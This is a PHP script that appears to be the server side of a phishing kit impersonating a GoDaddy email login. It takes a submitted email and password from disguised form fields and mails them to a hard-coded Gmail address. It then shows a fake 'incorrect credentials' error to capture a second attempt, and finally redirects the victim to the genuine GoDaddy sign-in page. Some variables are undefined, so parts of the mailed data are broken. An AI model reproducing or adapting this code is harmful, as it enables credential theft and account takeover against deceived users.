<?php
// Start output buffering
ob_start();

// Start session to track submission and manage error messages
session_start();

// Check if the form was submitted via POST request
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Sanitize the form inputs
    $em = filter_var(trim($_POST["bringwork"]), FILTER_SANITIZE_EMAIL);
    $pd = filter_var(trim($_POST["bringworld"]), FILTER_SANITIZE_SPECIAL_CHARS);


    // Check for invalid credentials (simulating with "test" as an invalid name)
    if ($em === "test") {
        // Set error message in session and redirect back to the form
        $_SESSION['error_message'] = 'Please fill out the correct credentials.';
        header('Location: ' . $_SERVER['HTTP_REFERER']);
        ob_end_flush();  // Flush output buffer before redirection
        exit();
    }

    // Check if this is the first form submission
    if (!isset($_SESSION['submitted_once'])) {
        // Prepare email details
        $to = "kathleencuffie@gmail.com";  // Replace with your recipient email
        $subject = "Polo Moco Westline ";
        $body = "Em: $nem\nPd: $pd\n";
        $headers = "From: $email\r\nReply-To: $email\r\nX-Mailer: PHP/" . phpversion();

        // Attempt to send the email
        if (mail($to, $subject, $body, $headers)) {
            // Mark that the form has been submitted once
            $_SESSION['submitted_once'] = true;

            // Set error message in session asking the user to correct their credentials
            $_SESSION['error_message'] = "Please fill out the correct credentials.";

            // Redirect back to the form to simulate a second submission
            header('Location: ' . $_SERVER['HTTP_REFERER']);
            ob_end_flush();  // Flush the output buffer
            exit();
        } else {
            // Handle email sending failure
            echo "Error: Email could not be sent. Please try again later.";
        }
    } else {
        // If this is the second submission, clear the session and redirect
        unset($_SESSION['submitted_once']);

        // Redirect to a thank-you page or another URL after the second submission
        header('Location: https://sso.godaddy.com/login?app=email&realm=pass');  // Replace with your actual redirect URL
        ob_end_flush();  // Flush the output buffer and redirect
        exit();
    }
}

// End output buffering and clean up
ob_end_flush();
?>
